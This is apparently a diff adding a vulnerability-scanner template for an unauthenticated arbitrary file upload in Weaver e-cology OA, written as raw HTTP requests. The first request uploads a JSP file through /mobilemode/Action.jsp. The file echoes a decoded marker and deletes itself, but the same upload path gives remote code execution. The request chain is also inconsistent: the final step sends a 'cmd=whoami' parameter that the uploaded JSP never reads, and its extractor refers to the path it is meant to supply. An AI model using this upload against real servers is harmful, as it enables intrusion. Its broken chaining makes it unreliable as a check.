@@ -1,0 +1,64 @@
+id: weaver-oa-file-upload
+info:
+  name: Weaver e-cology OA Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver e-cology OA has an arbitrary file upload vulnerability that allows attackers to upload malicious files to the server, potentially leading to remote code execution.
+  classification:
+    cvss-score: 9.8
+    cvss-metrics: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  tags: file-upload, vulnerability
+
+http:
+  - raw:
+      - |
+        POST /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRoL5N5mD7MRNEdNE
+
+        ------WebKitFormBoundaryRoL5N5mD7MRNEdNE
+        Content-Disposition: form-data; name="upload"; filename="test.jsp"
+        Content-Type: text/plain
+
+        <%
+        out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("YzEyYjEwMTIwYmM5ZjQ0NGFmY2I2NDYyMmYzOGJiMjE=")));
+        new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryRoL5N5mD7MRNEdNE--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SUCCESS"
+
+  - raw:
+      - |
+        GET /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "/mobilemode.*?jsp"
+
+  - raw:
+      - |
+        GET /{{ExtractedPath}}?cmd=whoami HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: ExtractedPath
+        internal: true
+        regex:
+          - "/mobilemode.*?jsp"
+    matchers:
+      - type: word
+        words:
+          - "c12b10120bc9f444afcb64622f38bb21"
